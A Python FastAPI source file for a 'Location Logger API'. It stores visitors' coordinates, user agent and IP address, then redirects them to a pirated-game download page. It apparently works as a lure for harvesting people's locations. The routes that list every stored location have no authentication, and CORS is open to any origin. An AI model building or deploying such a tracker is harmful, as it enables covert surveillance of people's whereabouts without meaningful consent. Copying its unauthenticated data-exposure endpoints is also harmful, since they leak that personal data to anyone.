# main.py

from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from typing import Optional
from uuid import uuid4
from datetime import datetime
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from fastapi_armor.middleware import ArmorMiddleware

from sqlalchemy import create_engine, Column, String, Float, DateTime
from sqlalchemy.orm import sessionmaker, declarative_base

# --- Database Setup ---
DATABASE_URL = "sqlite:////home/transformerxxx/location/data/app.db"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

class Location(Base):
    __tablename__ = "locations"
    id = Column(String, primary_key=True, index=True)
    latitude = Column(Float, nullable=False)
    longitude = Column(Float, nullable=False)
    accuracy = Column(Float)
    timestamp = Column(DateTime, default=datetime.utcnow)
    userAgent = Column(String)
    ipAddress = Column(String)
    createdAt = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(bind=engine)

# --- FastAPI App Setup ---
app = FastAPI(
    title="Location Logger API",
    description="Collects location data and provides admin and web views",
    version="1.0.0"
)

# Security headers
app.add_middleware(
    ArmorMiddleware,
    preset="basic",
    permissions_policy="geolocation=()"
)

# Rate limiting
limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(429, _rate_limit_exceeded_handler)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Static and templates
from fastapi.staticfiles import StaticFiles
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# --- Models ---
class LocationData(BaseModel):
    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    timestamp: Optional[str] = None
    userAgent: Optional[str] = None

# --- Routes ---

@app.get("/", response_class=HTMLResponse)
async def serve_index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/api/locations")
@limiter.limit("100/15minutes")
async def store_location(request: Request, data: LocationData):
    if data.latitude is None or data.longitude is None:
        raise HTTPException(status_code=400, detail="Missing required fields")

    db = SessionLocal()
    loc = Location(
        id=str(uuid4()),
        latitude=data.latitude,
        longitude=data.longitude,
        accuracy=data.accuracy,
        timestamp=datetime.fromisoformat(data.timestamp) if data.timestamp else datetime.utcnow(),
        userAgent=data.userAgent,
        ipAddress=request.client.host,
        createdAt=datetime.utcnow()
    )
    db.add(loc)
    db.commit()
    db.close()

    return JSONResponse(status_code=201, content={
        "success": True,
        "message": "Location stored successfully",
        "redirectUrl": "https://fitgirl-repacks.site/marvels-spider-man-2/"
    })

@app.get("/admin/locations")
async def admin_locations():
    db = SessionLocal()
    locs = db.query(Location).all()
    db.close()
    return {"count": len(locs), "locations": [vars(l) for l in locs]}

@app.get("/view-locations", response_class=HTMLResponse)
async def view_locations(request: Request):
    db = SessionLocal()
    locs = db.query(Location).all()
    db.close()
    return templates.TemplateResponse("view_locations.html", {"request": request, "locations": locs})
